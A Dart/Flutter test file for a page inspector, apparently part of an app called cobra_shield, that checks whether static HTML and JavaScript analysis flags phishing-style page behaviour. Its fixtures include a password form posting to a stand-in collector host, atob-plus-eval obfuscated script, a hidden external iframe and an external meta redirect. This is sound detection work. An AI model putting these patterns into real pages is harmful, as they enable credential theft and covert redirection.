import 'package:cobra_shield/services/page_behavior_inspector.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('PageBehaviorInspector static HTML/JavaScript analysis', () {
    test('detects password form that posts to another host', () {
      const html = '''
        <html><body>
          <form method="post" action="https://collector.example/submit">
            <input type="password" name="password">
          </form>
        </body></html>
      ''';
      final findings = PageBehaviorInspector.analyzeDocumentForTesting(
        html,
        'https://login.example/',
      );
      expect(findings.any((f) => f.code == 'credential_form_external'), isTrue);
    });

    test('detects a suspicious combination of runtime JS execution and decoding', () {
      const html = '''
        <html><script>
          const payload = atob('QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=');
          eval(payload);
        </script></html>
      ''';
      final findings = PageBehaviorInspector.analyzeDocumentForTesting(
        html,
        'https://site.example/',
      );
      expect(findings.any((f) => f.code == 'obfuscated_inline_javascript'), isTrue);
    });

    test('detects hidden external iframe and external meta refresh', () {
      const html = '''
        <html><head><meta http-equiv="refresh" content="0; url=https://next.example/"></head>
        <body><iframe src="https://frame.example/" style="display:none" width="0"></iframe></body></html>
      ''';
      final findings = PageBehaviorInspector.analyzeDocumentForTesting(
        html,
        'https://site.example/',
      );
      expect(findings.any((f) => f.code == 'hidden_external_iframe'), isTrue);
      expect(findings.any((f) => f.code == 'external_meta_redirect'), isTrue);
    });

    test('inspects supplied external script text without executing it', () {
      final findings = PageBehaviorInspector.analyzeDocumentForTesting(
        '<html><script src="https://cdn.example/app.js"></script></html>',
        'https://site.example/',
        additionalJavaScript: 'const payload = atob("encoded"); eval(payload);',
      );
      expect(findings.any((f) => f.code == 'obfuscated_inline_javascript'), isTrue);
    });

    test('does not call a normal dynamic navigation command malicious alone', () {
      const html = '<html><script>window.location.href = "/home";</script></html>';
      final findings = PageBehaviorInspector.analyzeDocumentForTesting(
        html,
        'https://site.example/',
      );
      expect(findings.any((f) => f.code == 'javascript_dynamic_navigation'), isTrue);
      expect(findings.any((f) => f.points >= 15), isFalse);
    });
  });
}
